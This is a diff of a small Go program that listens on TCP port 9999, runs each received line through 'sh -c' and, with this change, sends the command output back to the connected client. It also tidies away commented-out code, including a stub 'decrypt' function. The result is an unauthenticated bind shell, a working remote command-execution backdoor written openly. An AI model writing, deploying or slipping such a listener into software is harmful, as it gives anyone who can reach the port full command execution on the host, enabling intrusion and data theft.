@@ -1,22 +1,15 @@
 package main
 
 import (
-	// "fmt"
 	"time"
 	"net"
 	"bufio"
 	"io"
 	"log"
 	"strings"
-	// "slices"
-	// "sync"
 	"os/exec"
 )
 
-// var (
-// 	CONCURRENCY int = 3
-// )
-//
 
 func main() {
 		listener, err := net.Listen("tcp", ":9999")
@@ -56,7 +49,12 @@ func connHandler(conn net.Conn) error {
 						return err
 				}
 				
-				_ = runCommand(command)
+				cmdOutput, err := runCommand(command)
+				_, err = conn.Write(cmdOutput)
+				if err != nil {
+					log.Print("error writing to client socket")
+					return err
+				}
 		}
 
 		return nil
@@ -66,71 +64,17 @@ func commandHandler() error {
 	return nil 
 }
 
-func runCommand(command string) error {
+func runCommand(command string) ([]byte	, error) {
 		// defer conn.Close()
 		out, err := exec.Command("sh", "-c", strings.TrimSpace(command)).Output()
 
 		if err != nil {
-			log.Fatalf("error occurred while running the command", err)
+			log.Print("error occurred while running the command", err)
 			// TODO handle it
-			//return err 
+			//return iierr 
+			return []byte{}, err
 		}
 
-		log.Println(string(out)) 
-		return nil
+		//log.Println(string(out)) 
+		return out, nil
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-// TODO : 
-
-	// if err != nil {
-	// 	log.Error("error while reading the tcp connection")
-	// }
-
-
-	//decrypted, err := decrypt(message)
-	//fmt.Println(strings.ToUpper(decrypted))
-
-	// fmt.Println(message)
-	// err = cmd.Run()
-	// cmd := strings.Split("ps -ef") message, "
-
-
-// func decrypt(v string) (string, error) {
-//  //13tor
-// 	// n := len(v)
-// 	arr := []byte(v)
-// 	slices.Reverse(arr)
-// 	return string(arr), nil
-// }
-//
